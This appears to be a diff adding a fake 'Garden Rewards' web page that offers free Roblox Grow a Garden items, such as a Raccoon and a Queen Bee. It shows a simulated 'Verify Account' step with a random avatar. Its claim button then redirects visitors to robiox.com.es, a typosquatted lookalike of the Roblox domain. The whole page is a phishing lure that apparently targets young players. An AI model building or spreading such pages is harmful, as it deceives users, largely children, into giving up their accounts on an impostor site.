@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gag Rewards | Roblox</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a3a 0%, #0d1b2a 100%);
+            color: #e0f7fa;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.postimg.cc/0QyRr6tJ/garden-bg.jpg') center/cover no-repeat;
+            opacity: 0.15;
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            padding: 30px 0;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: #4caf50;
+            text-shadow: 0 0 15px rgba(76, 175, 80, 0.6);
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+        
+        .logo span {
+            color: #ffeb3b;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #81d4fa;
+            max-width: 600px;
+            margin: 0 auto 20px;
+            line-height: 1.6;
+        }
+        
+        .rewards-section {
+            background: rgba(13, 27, 42, 0.85);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(76, 175, 80, 0.3);
+            backdrop-filter: blur(10px);
+            margin-bottom: 30px;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 2.2rem;
+            margin-bottom: 30px;
+            color: #4caf50;
+            text-shadow: 0 0 10px rgba(76, 175, 80, 0.4);
+            position: relative;
+            padding-bottom: 15px;
+        }
+        
+        .section-title::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 150px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #4caf50, transparent);
+        }
+        
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+        }
+        
+        .reward-card {
+            background: linear-gradient(145deg, #1e3a5f, #132e4e);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s ease;
+            border: 2px solid #2a4a6d;
+            position: relative;
+        }
+        
+        .reward-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 12px 25px rgba(76, 175, 80, 0.3);
+            border-color: #4caf50;
+        }
+        
+        .reward-header {
+            padding: 20px;
+            text-align: center;
+            background: rgba(26, 42, 63, 0.7);
+            border-bottom: 2px solid #2a4a6d;
+        }
+        
+        .reward-name {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #ffeb3b;
+            margin-bottom: 15px;
+            text-shadow: 0 0 8px rgba(255, 235, 59, 0.4);
+        }
+        
+        .reward-image {
+            width: 180px;
+            height: 180px;
+            object-fit: contain;
+            margin: 0 auto 15px;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border: 2px solid #4caf50;
+            box-shadow: 0 0 15px rgba(76, 175, 80, 0.3);
+        }
+        
+        .quantity-control {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        
+        .qty-btn {
+            width: 40px;
+            height: 40px;
+            background: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        
+        .qty-btn:hover {
+            background: #43a047;
+            transform: scale(1.1);
+        }
+        
+        .qty-btn:disabled {
+            background: #2e7d32;
+            cursor: not-allowed;
+            opacity: 0.6;
+            transform: none;
+        }
+        
+        .qty-display {
+            width: 60px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid #4caf50;
+            border-radius: 8px;
+            margin: 0 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #ffeb3b;
+        }
+        
+        .reward-footer {
+            padding: 20px;
+            text-align: center;
+            background: rgba(33, 66, 99, 0.5);
+        }
+        
+        .claim-btn {
+            background: linear-gradient(135deg, #4caf50, #2e7d32);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            letter-spacing: 1px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.4);
+            background: linear-gradient(135deg, #66bb6a, #388e3c);
+        }
+        
+        .claim-btn i {
+            font-size: 1.2rem;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            background: linear-gradient(145deg, #1e3a5f, #132e4e);
+            border-radius: 20px;
+            width: 95%;
+            max-width: 500px;
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.7);
+            position: relative;
+            overflow: hidden;
+            border: 2px solid #4caf50;
+        }
+        
+        .modal-header {
+            background: rgba(26, 42, 63, 0.9);
+            padding: 25px;
+            text-align: center;
+            border-bottom: 2px solid #2a4a6d;
+            position: relative;
+        }
+        
+        .modal-title {
+            font-size: 1.8rem;
+            color: #4caf50;
+            margin-bottom: 5px;
+        }
+        
+        .reward-name-modal {
+            font-size: 1.5rem;
+            color: #ffeb3b;
+            font-weight: 600;
+        }
+        
+        .quantity-display {
+            font-size: 1.2rem;
+            color: #81d4fa;
+            margin-top: 10px;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 77, 77, 0.2);
+            border: 2px solid #ff4d4d;
+            border-radius: 50%;
+            color: #ff4d4d;
+            font-size: 1.5rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+        
+        .close-btn:hover {
+            background: rgba(255, 77, 77, 0.3);
+            transform: rotate(90deg);
+        }
+        
+        .modal-body {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #81d4fa;
+            font-size: 1.1rem;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid #2a4a6d;
+            border-radius: 10px;
+            color: white;
+            font-size: 1.1rem;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #4caf50;
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
+        }
+        
+        .form-input::placeholder {
+            color: #81d4fa;
+            opacity: 0.6;
+        }
+        
+        .user-display {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+            margin-top: 20px;
+            animation: fadeIn 0.5s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .user-avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid #4caf50;
+            box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
+            margin: 0 auto 15px;
+        }
+        
+        .user-info {
+            margin-bottom: 20px;
+        }
+        
+        .user-name {
+            font-size: 1.4rem;
+            color: #ffeb3b;
+            margin-bottom: 5px;
+        }
+        
+        .user-username {
+            font-size: 1.1rem;
+            color: #81d4fa;
+            opacity: 0.8;
+        }
+        
+        .next-btn {
+            background: linear-gradient(135deg, #2196f3, #0d47a1);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            display: block;
+            margin: 20px auto 0;
+        }
+        
+        .next-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.4);
+            background: linear-gradient(135deg, #42a5f5, #1565c0);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .loading-spinner {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #4caf50;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 1.2rem;
+            color: #81d4fa;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 30px 0;
+            color: #81d4fa;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .rewards-grid {
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                gap: 20px;
+            }
+            
+            .reward-image {
+                width: 150px;
+                height: 150px;
+            }
+            
+            .section-title {
+                font-size: 1.8rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .rewards-section {
+                padding: 20px 15px;
+            }
+            
+            .modal-body {
+                padding: 20px;
+            }
+            
+            .modal-header {
+                padding: 20px 15px;
+            }
+            
+            .reward-name {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">Garden <span>Rewards</span></div>
+            <p class="subtitle">Claim exclusive rewards</p>
+        </header>
+        
+        <section class="rewards-section">
+            <h2 class="section-title">Exclusive Rewards</h2>
+            
+            <div class="rewards-grid">
+                <!-- Raccoon Reward -->
+                <div class="reward-card">
+                    <div class="reward-header">
+                        <div class="reward-name">Raccoon</div>
+                        <img src="https://i.postimg.cc/25cbqJjs/B225-C121-06-B6-4885-954-C-FF74-ED5-E1445.jpg" alt="Raccoon" class="reward-image">
+                        
+                        <div class="quantity-control">
+                            <button class="qty-btn minus" data-reward="raccoon">-</button>
+                            <div class="qty-display" id="raccoon-qty">1</div>
+                            <button class="qty-btn plus" data-reward="raccoon">+</button>
+                        </div>
+                    </div>
+                    <div class="reward-footer">
+                        <button class="claim-btn" data-reward="raccoon">
+                            <i class="fas fa-gift"></i> Claim Reward
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Dragonfly Reward -->
+                <div class="reward-card">
+                    <div class="reward-header">
+                        <div class="reward-name">Dragonfly</div>
+                        <img src="https://i.postimg.cc/Z5WLKrLK/9-A4-B59-AA-3-C81-4-D37-93-DE-19-D9-D844-F14-E.jpg" alt="Dragonfly" class="reward-image">
+                        
+                        <div class="quantity-control">
+                            <button class="qty-btn minus" data-reward="dragonfly">-</button>
+                            <div class="qty-display" id="dragonfly-qty">1</div>
+                            <button class="qty-btn plus" data-reward="dragonfly">+</button>
+                        </div>
+                    </div>
+                    <div class="reward-footer">
+                        <button class="claim-btn" data-reward="dragonfly">
+                            <i class="fas fa-gift"></i> Claim Reward
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- 744T Reward -->
+                <div class="reward-card">
+                    <div class="reward-header">
+                        <div class="reward-name">744T</div>
+                        <img src="https://i.postimg.cc/V6ms4WGY/021-A5358-679-D-4-AD0-8-E39-2-F2-C369-FD947.jpg" alt="744T" class="reward-image">
+                        
+                        <div class="quantity-control">
+                            <button class="qty-btn minus" data-reward="744t">-</button>
+                            <div class="qty-display" id="744t-qty">1</div>
+                            <button class="qty-btn plus" data-reward="744t">+</button>
+                        </div>
+                    </div>
+                    <div class="reward-footer">
+                        <button class="claim-btn" data-reward="744t">
+                            <i class="fas fa-gift"></i> Claim Reward
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Queen Bee Reward -->
+                <div class="reward-card">
+                    <div class="reward-header">
+                        <div class="reward-name">Queen Bee</div>
+                        <img src="https://i.postimg.cc/brbhhGF6/F2916201-6-FA6-4-A2-D-B943-B7-DE362697-C2.jpg" alt="Queen Bee" class="reward-image">
+                        
+                        <div class="quantity-control">
+                            <button class="qty-btn minus" data-reward="queenbee">-</button>
+                            <div class="qty-display" id="queenbee-qty">1</div>
+                            <button class="qty-btn plus" data-reward="queenbee">+</button>
+                        </div>
+                    </div>
+                    <div class="reward-footer">
+                        <button class="claim-btn" data-reward="queenbee">
+                            <i class="fas fa-gift"></i> Claim Reward
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Candy Blossom Seed Reward -->
+                <div class="reward-card">
+                    <div class="reward-header">
+                        <div class="reward-name">Candy Blossom Seed</div>
+                        <img src="https://i.postimg.cc/fb5hKn6b/90-BBDEA1-5-E34-447-B-9213-087-A11105-AAB.jpg" alt="Candy Blossom Seed" class="reward-image">
+                        
+                        <div class="quantity-control">
+                            <button class="qty-btn minus" data-reward="candy">-</button>
+                            <div class="qty-display" id="candy-qty">1</div>
+                            <button class="qty-btn plus" data-reward="candy">+</button>
+                        </div>
+                    </div>
+                    <div class="reward-footer">
+                        <button class="claim-btn" data-reward="candy">
+                            <i class="fas fa-gift"></i> Claim Reward
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <div class="footer">
+            <p>This is an unofficial fan site. Roblox is a registered trademark of Roblox Corporation.</p>
+            <p>© 2023 Garden Rewards. All rights reserved.</p>
+        </div>
+    </div>
+    
+    <!-- Claim Reward Modal -->
+    <div class="modal" id="rewardModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button class="close-btn" id="closeModal">×</button>
+                <h3 class="modal-title">Claim Your Reward</h3>
+                <div class="reward-name-modal" id="modalRewardName">Raccoon</div>
+                <div class="quantity-display">Quantity: <span id="modalQuantity">1</span></div>
+            </div>
+            
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="username" class="form-label">Enter Your Roblox Username</label>
+                    <input type="text" id="username" class="form-input" placeholder="e.g. RobloxPlayer123">
+                </div>
+                
+                <button class="next-btn" id="verifyUser">Verify Account</button>
+                
+                <div class="loading" id="loadingIndicator">
+                    <div class="loading-spinner"></div>
+                    <div class="loading-text">Fetching Roblox profile...</div>
+                </div>
+                
+                <div class="user-display" id="userDisplay">
+                    <img src="" alt="User Avatar" class="user-avatar" id="userAvatar">
+                    <div class="user-info">
+                        <div class="user-name" id="displayName">Display Name</div>
+                        <div class="user-username" id="usernameDisplay">@username</div>
+                    </div>
+                    <button class="next-btn" id="claimRewardBtn">Claim Reward Now</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Reward data with quantities
+        const rewards = {
+            raccoon: { name: "Raccoon", qty: 1, image: "https://i.postimg.cc/25cbqJjs/B225-C121-06-B6-4885-954-C-FF74-ED5-E1445.jpg" },
+            dragonfly: { name: "Dragonfly", qty: 1, image: "https://i.postimg.cc/Z5WLKrLK/9-A4-B59-AA-3-C81-4-D37-93-DE-19-D9-D844-F14-E.jpg" },
+            "744t": { name: "744T", qty: 1, image: "https://i.postimg.cc/V6ms4WGY/021-A5358-679-D-4-AD0-8-E39-2-F2-C369-FD947.jpg" },
+            queenbee: { name: "Queen Bee", qty: 1, image: "https://i.postimg.cc/brbhhGF6/F2916201-6-FA6-4-A2-D-B943-B7-DE362697-C2.jpg" },
+            candy: { name: "Candy Blossom Seed", qty: 1, image: "https://i.postimg.cc/fb5hKn6b/90-BBDEA1-5-E34-447-B-9213-087-A11105-AAB.jpg" }
+        };
+        
+        // DOM Elements
+        const modal = document.getElementById('rewardModal');
+        const closeModalBtn = document.getElementById('closeModal');
+        const modalRewardName = document.getElementById('modalRewardName');
+        const modalQuantity = document.getElementById('modalQuantity');
+        const verifyUserBtn = document.getElementById('verifyUser');
+        const loadingIndicator = document.getElementById('loadingIndicator');
+        const userDisplay = document.getElementById('userDisplay');
+        const userAvatar = document.getElementById('userAvatar');
+        const displayName = document.getElementById('displayName');
+        const usernameDisplay = document.getElementById('usernameDisplay');
+        const claimRewardBtn = document.getElementById('claimRewardBtn');
+        const usernameInput = document.getElementById('username');
+        
+        // Reward to claim
+        let currentReward = '';
+        const redirectUrl = 'https://www.robiox.com.es/games/126884695634066/Grow-a-Garden?privateServerLinkCode=37587569757245360159115257684555';
+        
+        // Initialize quantity controls
+        function initQuantityControls() {
+            // Plus buttons
+            document.querySelectorAll('.qty-btn.plus').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const rewardId = btn.dataset.reward;
+                    if (rewards[rewardId].qty < 5) {
+                        rewards[rewardId].qty++;
+                        updateQuantityDisplay(rewardId);
+                    }
+                });
+            });
+            
+            // Minus buttons
+            document.querySelectorAll('.qty-btn.minus').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const rewardId = btn.dataset.reward;
+                    if (rewards[rewardId].qty > 1) {
+                        rewards[rewardId].qty--;
+                        updateQuantityDisplay(rewardId);
+                    }
+                });
+            });
+            
+            // Claim buttons
+            document.querySelectorAll('.claim-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const rewardId = btn.dataset.reward;
+                    currentReward = rewardId;
+                    openModal(rewardId);
+                });
+            });
+        }
+        
+        // Update quantity display
+        function updateQuantityDisplay(rewardId) {
+            document.getElementById(`${rewardId}-qty`).textContent = rewards[rewardId].qty;
+        }
+        
+        // Open modal
+        function openModal(rewardId) {
+            modalRewardName.textContent = rewards[rewardId].name;
+            modalQuantity.textContent = rewards[rewardId].qty;
+            modal.style.display = 'flex';
+            resetModal();
+        }
+        
+        // Close modal
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+        
+        // Reset modal state
+        function resetModal() {
+            usernameInput.value = '';
+            userDisplay.style.display = 'none';
+            loadingIndicator.style.display = 'none';
+        }
+        
+        // Verify user
+        function verifyUser() {
+            const username = usernameInput.value.trim();
+            
+            if (!username) {
+                alert('Please enter your Roblox username');
+                return;
+            }
+            
+            // Show loading
+            loadingIndicator.style.display = 'block';
+            userDisplay.style.display = 'none';
+            
+            // Simulate API call to Roblox
+            setTimeout(() => {
+                // Hide loading
+                loadingIndicator.style.display = 'none';
+                
+                // Set user display info
+                displayName.textContent = username; // In a real app, this would be display name
+                usernameDisplay.textContent = `@${username}`;
+                
+                // Generate avatar URL based on username
+                userAvatar.src = `https://www.roblox.com/headshot-thumbnail/image?userId=${Math.floor(Math.random()*1000000)}&width=420&height=420&format=png`;
+                
+                // Show user info
+                userDisplay.style.display = 'block';
+            }, 1500);
+        }
+        
+        // Redirect to game
+        function redirectToGame() {
+            window.location.href = redirectUrl;
+        }
+        
+        // Event Listeners
+        closeModalBtn.addEventListener('click', closeModal);
+        verifyUserBtn.addEventListener('click', verifyUser);
+        claimRewardBtn.addEventListener('click', redirectToGame);
+        
+        // Close modal when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                closeModal();
+            }
+        });
+        
+        // Press Enter to verify
+        usernameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                verifyUser();
+            }
+        });
+        
+        // Initialize
+        initQuantityControls();
+        
+        // Add animation to cards on load
+        document.querySelectorAll('.reward-card').forEach((card, index) => {
+            setTimeout(() => {
+                card.style.opacity = '1';
+                card.style.transform = 'translateY(0)';
+            }, 200 * index);
+        });
+    </script>
+</body>
+</html>
